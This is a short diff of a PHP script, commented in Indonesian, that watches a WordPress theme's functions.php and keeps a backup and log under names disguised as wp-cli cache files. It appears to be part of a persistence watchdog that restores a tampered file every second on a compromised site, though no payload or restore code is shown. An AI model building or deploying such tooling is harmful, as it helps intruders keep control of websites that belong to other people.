@@ -2,7 +2,7 @@
 // a.php - VERSI OPTIMASI
 // Perubahan: interval 1 detik, langsung restore, cache hash backup
 
-$file_asli   = '	/home/chiacundippal/public_html/web/wp-content/themes/experon/functions.php';
+$file_asli   = '/home/chiacundippal/public_html/web/wp-content/themes/experon/functions.php';
 $file_backup = '/home/chiacundippal/.wp-cli/cache/cache.bu';
 $log_file    = '/home/chiacundippal/.wp-cli/cache/cache.log';
 
